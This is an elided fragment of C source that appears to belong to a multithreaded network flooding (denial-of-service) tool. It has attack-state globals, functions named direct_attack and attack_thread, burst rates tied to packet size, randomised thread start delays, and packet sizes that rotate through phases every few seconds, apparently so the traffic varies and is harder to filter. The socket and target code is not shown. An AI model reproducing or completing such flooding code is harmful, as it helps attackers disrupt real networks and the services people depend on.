...
_Atomic int should_attack = 1;
_Atomic int attack_seconds = 0;
_Atomic int total_elapsed = 0;
_Atomic int phase_shift = 0;
_Atomic int global_packet_size = 10;
...
int get_base_burst(int packet_size) {
    if (packet_size <= 48) return 140;
    if (packet_size <= 56) return 130;
    if (packet_size <= 64) return 120;
    if (packet_size <= 72) return 110;
    return 100;
}
...
void *direct_attack(void *arg) {
    ...
    int delay_seconds = (thread_idx % 5 < 2) ? 12 + (fast_rand(&rotation_seed) % 6) : 0;
    ...
    while (!atomic_load(&stop_signal)) {
        ...
        static int last_phase_update = 0;
        if (thread_idx == 0 && current_elapsed % 10 == 0 && current_elapsed > last_phase_update) {
            last_phase_update = current_elapsed;
            int new_phase = (current_elapsed / 10) % 3;
            atomic_store(&phase_shift, new_phase);
        }
        
        if (current_elapsed % 5 == 0 && current_elapsed > last_rotation) {
            last_rotation = current_elapsed;
            if (thread_idx % 5 == 0) {
                int phase = atomic_load(&phase_shift);
                int *sizes;
                int len;
                if (phase == 0) {
                    static int s0[] = {10,12,14,16,18};
                    sizes = s0; len = 5;
                } else if (phase == 1) {
                    static int s1[] = {20,22,24,26,28};
                    sizes = s1; len = 5;
                } else {
                    static int s2[] = {30,32,34,36,38,40,42,44,46,48};
                    sizes = s2; len = 10;
                }
                int new_size = sizes[fast_rand(&rotation_seed) % len];
...
void *attack_thread(void *arg) {
    ...
    int last_rotation = 0;
    int delay_seconds = (tid % 5 < 2) ? 12 + (fast_rand(&rotation_seed) % 6) : 0;
